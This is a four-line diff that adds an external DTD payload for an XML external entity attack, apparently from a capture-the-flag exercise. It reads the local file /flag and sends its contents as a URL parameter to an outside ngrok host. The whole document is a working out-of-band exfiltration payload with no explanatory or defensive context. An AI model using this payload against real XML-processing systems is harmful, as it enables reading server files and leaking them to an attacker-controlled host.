@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://26ba-46-231-240-178.ngrok-free.app/?flag=%file;'>">
+%all;
+%send;>
